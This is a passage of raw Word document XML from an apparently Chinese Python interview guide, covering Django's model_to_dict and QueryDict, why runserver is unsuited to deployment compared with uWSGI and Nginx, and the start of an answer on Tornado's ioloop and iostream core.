        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;manage.py shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB45024" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; from django.contrib.auth.models import User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42731D77" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; from django.forms.models import model_to_dict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="553E3466" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; u = User.objects.get(id=1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E6D028C" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; u_dict = model_to_dict(u)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4707985D" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; type(u)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="096D0A05" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>&lt;class 'django.contrib.auth.models.User'&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37261A50" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; type(u_dict)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BCC4741" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;type 'dict'&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D65A6F" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18583BA7" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    1.QueryDict.__init__(query_string=None, mutable=False, encoding=None)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BF53BBB" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">　　这是一个构造函数，其中 query_string 需要一个字符串，例如：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A01220A" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7883C0CE" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; QueryDict('a=1&amp;a=2&amp;c=3')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F96C6B" w14:textId="36F2EC62" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;QueryDict: {'a': ['1', '2'], 'c': ['3']}&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48EC465D" w14:textId="3FF5ED45" w:rsidR="00717181" w:rsidRDefault="00557AFE" w:rsidP="00717181">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062</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>本身提供了</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>runserver</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>，为什么不能用来部署？</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B54469D" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    runserver</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法是调试</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>时经常用到的运行方式，它使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>自带的</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> WSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Server</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>运行，主要在测试和开发中使用，并且</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>runserver</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>开启的方式也是单进程</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B25ACEE" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>   </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>uWSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>是一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>服务器，它实现了</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>协议、uwsgi、http</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>等协议。注意</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>uwsgi</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>是一种通信协议，而</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>uWSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>是实现</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>uwsgi</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>协议和</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>协议的</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>服务器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66C5FA47" w14:textId="6A3D46C8" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    uWSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>具有超快的性能、低内存占用和多</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>管理等优点，并且搭配着</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Nginx</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 就是一个生产环境了，能够将用户访问请求与应用</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>隔离开，实现真正的部署</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>。相比来讲，支持的并发量更高，方便管理多进程，发挥多核的优势，提升性能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D1396B" w14:textId="7807E46C" w:rsidR="00717181" w:rsidRDefault="00557AFE" w:rsidP="00717181">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063</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Tornado</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的核是什么？</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79423626" w14:textId="76AAD7D8" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00717181" w:rsidP="00557AFE">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> Tornado</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>的核心是</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>ioloop</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>iostream</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>这两个模块，前者提供了一个高效的</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>I/O</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>事件循环，后者则封装了</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一个无阻塞的</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>socket</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
